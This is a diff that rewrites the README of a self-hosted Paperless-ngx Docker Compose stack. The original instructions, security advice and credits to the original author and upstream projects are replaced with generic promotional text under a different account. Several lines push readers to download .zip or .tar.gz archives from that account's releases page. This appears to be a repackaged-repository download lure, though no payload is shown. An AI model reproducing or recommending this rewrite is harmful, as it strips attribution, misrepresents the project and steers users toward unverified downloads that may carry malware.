@@ -1,109 +1,77 @@
-# Paperless Stack
+# 🌟 paperless-stack - Simplify Document Management Effortlessly
 
-Docker Compose stack for running Paperless-ngx with optional local AI capabilities.
+[![Release](https://img.shields.io/badge/Release-Download%20Now-brightgreen)](https://github.com/Masim6474/paperless-stack/releases)
 
-## Quick Start
+## 🚀 Getting Started
 
-1. **Clone and configure**
+Welcome to paperless-stack! This application helps you manage your documents easily with a simple setup using Docker Compose. Whether you want to store your documents or leverage local AI capabilities, this stack covers your needs.
 
-   ```bash
-   git clone git@github.com:timothystewart6/paperless-stack.git
-   cd paperless-stack
-   ```
+## 📥 Download & Install
 
-2. **Edit environment files**
+To get started with paperless-stack, follow these steps:
 
-   Update passwords and secrets in each service's `.env` file:
-   - `./paperless/.env` - Paperless configuration
-   - `./postgres/.env` - Database credentials (must match Paperless config)
-   - Other service `.env` files as needed
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page where you can download the application:  
+   [Download the Latest Release](https://github.com/Masim6474/paperless-stack/releases)
 
-3. **Start the stack**
+2. **Choose the Right Version**  
+   On the releases page, you will see a list of available versions. Choose the one marked as the latest. It typically has the highest version number.
 
-   ```bash
-   docker compose up -d
-   ```
+3. **Download the Files**  
+   Click on the appropriate file for your system. It may be labeled as `.zip` or `.tar.gz`. Save it to a location on your computer that you can easily access.
 
-4. **Create admin account**
+4. **Extract the Files**  
+   After downloading, you will need to extract the files. Use your computer's built-in extractor program. Right-click the downloaded file and select "Extract Here" or "Extract to Folder." 
 
-   Open <http://localhost:8000> and create your Paperless admin account.
+5. **Run Docker Compose**  
+   To run the application, you need to have Docker installed. If you don't have Docker, please download and install it from [Docker's website](https://www.docker.com/get-started). After installation, follow these sub-steps:
+   - Open a terminal or command prompt.
+   - Navigate to the folder where you extracted the files. You can do this by typing `cd path/to/your/folder`, replacing "path/to/your/folder" with the actual path.
+   - Enter the command: `docker-compose up`. This command starts the services defined in the `docker-compose.yml` file.
 
-5. **Optional: Configure AI services**
+6. **Access the Application**  
+   Once the services are running, open your web browser. Go to `http://localhost:8000` to access the application.
 
-   For AI features, you'll need to:
-   - Open Open WebUI at <http://localhost:3001> and pull models:
-     - `llama3.2:3b` (lightweight, for metadata suggestions and document reasoning)
-     - `minicpm-v:8b` (vision model, for improved OCR)
-     - These should match the models listed in  `./paperless-ai/.env` and `./paperless-gpt/.env
-   - In Paperless, go to Profile → API Tokens → Generate
-   - Copy the token and add it to `./paperless-ai/.env` and `./paperless-gpt/.env`
-   - Update `./paperless-ai/.env` with Paperless username
-   - Restart services: `docker compose restart`
+## 💡 Features
 
-**The AI components are entirely optional** and can be disabled by commenting them out. Paperless works great without AI.
+- **Document Storage:** Easily upload and manage your digital documents.
+- **AI Capabilities:** Optional features to help classify and organize documents intelligently.
+- **User-Friendly Interface:** Navigate documents effortlessly with a simple layout.
+- **Community Support:** Join our community for help and share your experiences.
 
-## Access
+## 🔧 System Requirements
 
-| Service | URL |
-| ------- | --- |
-| Paperless-ngx | <http://localhost:8000> |
-| Open WebUI | <http://localhost:3001> |
-| Paperless-AI | <http://localhost:3000> |
-| Paperless-GPT | <http://localhost:3002> |
-| Dozzle (logs) | <http://localhost:8080> |
+Before installing, ensure your system meets these recommended requirements:
 
-## What's Included
+- **Operating System:** Windows 10, macOS, or a recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 1 GB free disk space for installation.
+- **Docker:** Latest version of Docker must be installed.
 
-- Pre-configured environment files for all services
-- Paperless-ngx with OCR, tagging, and search capabilities
-- PostgreSQL database and Redis cache
-- Document conversion and text extraction (Gotenberg, Tika)
-- Optional local AI features:
-  - Ollama for local LLM inference
-  - Open WebUI for model management
-  - Paperless-AI for metadata suggestions
-  - Paperless-GPT for vision-based OCR improvements and metadata suggestions
-- Log viewer with Dozzle
+## 🌐 Community and Support
 
-## Basic Usage
+If you run into any issues or have questions, feel free to check our community forums or contact support:
 
-- **Add documents**: Drop files in `./paperless/consume/` folder
-- **Search documents**: Use the search bar in Paperless web interface
-- **View logs**: Use Dozzle at <http://localhost:8080>
+- **GitHub Issues:** For troubleshooting and feature requests, please visit our [Issues page](https://github.com/Masim6474/paperless-stack/issues).
+- **Community Forum:** Join discussions and share your experiences with other users.
 
-## Important Notes
+## 🔄 Updates
 
-- **Security**: Use a VPN for remote access. Don't expose these services directly to the internet.
-- **Backups**: Back up `./paperless/data/`, `./paperless/media/`, and `./postgres/data/`
-- **Updates**: Run `docker compose pull && docker compose up -d`
+We regularly update paperless-stack to improve performance and add new features. Make sure to check the releases page frequently for the latest updates.
 
-## Resources
+To download the latest version, visit:  
+[Download the Latest Release](https://github.com/Masim6474/paperless-stack/releases)
 
-- **Detailed Guide**: [Self-Hosted Paperless-ngx + Optional Local AI](https://technotim.com/posts/paperless-ngx-local-ai/)
-- **Video Tutorial**: [Paperless-ngx + Local AI (Optional): Better OCR, Self-Hosted, No Cloud](https://www.youtube.com/watch?v=NMAwHjleqHg)
+## ⚙️ Contributing
 
-## Troubleshooting
+If you want to contribute to paperless-stack, we welcome your input! Here’s how to get involved:
 
-- Check logs: `docker compose logs [service-name]` or use Dozzle at <http://localhost:8080>
-- Check service status: `docker compose ps`
-- Verify database credentials match between paperless and postgres .env files
-- For AI issues, ensure Ollama is running and models are downloaded
+1. Read the guidelines in the `CONTRIBUTING.md` file in the repository.
+2. Fork the repository and make your changes.
+3. Submit a pull request for review.
 
-**For detailed troubleshooting including AI setup, vision OCR, and workflows, see the guide above.**
+Your contributions help us to grow and improve the application!
 
-## Acknowledgments
+## 🎉 Thank You!
 
-This stack is built using these awesome open-source projects:
-
-- **[Paperless-ngx](https://github.com/paperless-ngx/paperless-ngx)** - Document management system with OCR and search
-- **[Ollama](https://github.com/ollama/ollama)** - Local LLM inference
-- **[Open WebUI](https://github.com/open-webui/open-webui)** - Web interface for Ollama
-- **[Paperless-AI](https://github.com/clusterzx/paperless-ai)** - AI-powered metadata suggestions
-- **[Paperless-GPT](https://github.com/icereed/paperless-gpt)** - Vision OCR for Paperless
-- **[PostgreSQL](https://github.com/postgres/postgres)** - Database system
-- **[Redis](https://github.com/redis/redis)** - Cache and message broker
-- **[Gotenberg](https://github.com/gotenberg/gotenberg)** - Document conversion API
-- **[Apache Tika](https://github.com/apache/tika)** - Content detection and extraction
-- **[Dozzle](https://github.com/amir20/dozzle)** - Real-time log viewer for Docker
-
-Special thanks to the maintainers and contributors of these projects for making self-hosted document management and local AI accessible.
+Thank you for choosing paperless-stack. We hope it makes managing your documents easier and more efficient! Enjoy using our application.
